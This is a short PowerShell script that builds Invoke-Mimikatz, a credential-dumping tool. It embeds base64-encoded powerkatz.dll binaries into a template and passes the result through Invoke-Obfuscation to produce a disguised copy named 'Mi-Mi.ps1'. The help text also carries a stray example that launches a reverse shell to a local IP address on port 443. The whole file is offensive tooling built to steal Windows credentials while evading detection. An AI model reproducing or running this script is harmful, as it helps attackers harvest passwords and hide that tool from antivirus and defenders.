function UpdateMimiTool 
{
<#
.SYNOPSIS
	This script is a simple helper for updating Invoke-Mimikatz starting from a template and 
    generate an obfuscated version.  
.DESCRIPTION
	Author: @b4rtik
	License: BSD 3-Clause
	Required Dependencies: Invoke-Obfuscation
	Optional Dependencies: None
.EXAMPLE
	C:\PS> Invoke-MetShell -lhost 192.168.1.5 -lport 443
#>
    $templateFile = 'C:\Users\b4rtik\Documents\WindowsPowerShell\Modules\Mimikatz\Invoke-Mimikatz-Template.ps1'
    $outputClear = 'C:\Users\b4rtik\Documents\WindowsPowerShell\Modules\Mimikatz\Invoke-Mimikatz.ps1'
    $outputObf = 'C:\Users\b4rtik\Documents\WindowsPowerShell\Modules\Mimikatz\Mi-Mi.ps1'

    $base64PE32 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\b4rtik\mimikatz\Win32\powerkatz.dll'))
    $base64PE64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\b4rtik\mimikatz\x64\powerkatz.dll'))
    
    if([System.IO.File]::Exists($outputClear))
    {
        Remove-Item –path $outputClear
    }

    Copy-Item -Path $templateFile -Destination $outputClear
    (Get-Content $outputClear) -replace '\#PE64\#', $base64PE64 | Set-Content $outputClear
    (Get-Content $outputClear) -replace '\#PE32\#', $base64PE32 | Set-Content $outputClear

    if([System.IO.File]::Exists($outputObf))
    {
        Remove-Item –path $outputObf
    }
    
    Invoke-Obfuscation -ScriptPath $outputClear -Command 'Token\All\1' -Quiet > $outputObf
}

UpdateMimiTool